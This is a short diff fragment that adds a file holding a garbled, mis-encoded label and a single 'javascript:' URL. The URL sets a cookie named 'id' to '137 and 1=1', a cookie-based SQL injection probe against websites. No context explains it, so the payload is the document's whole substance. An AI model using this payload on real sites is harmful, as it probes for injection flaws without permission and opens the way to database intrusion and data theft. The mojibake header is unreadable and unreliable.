@@ -1,0 +1,3 @@
+Óï¾ä£º
+
+	javascript:alert(document.cookie="id="+escape("137 and 1=1")); 
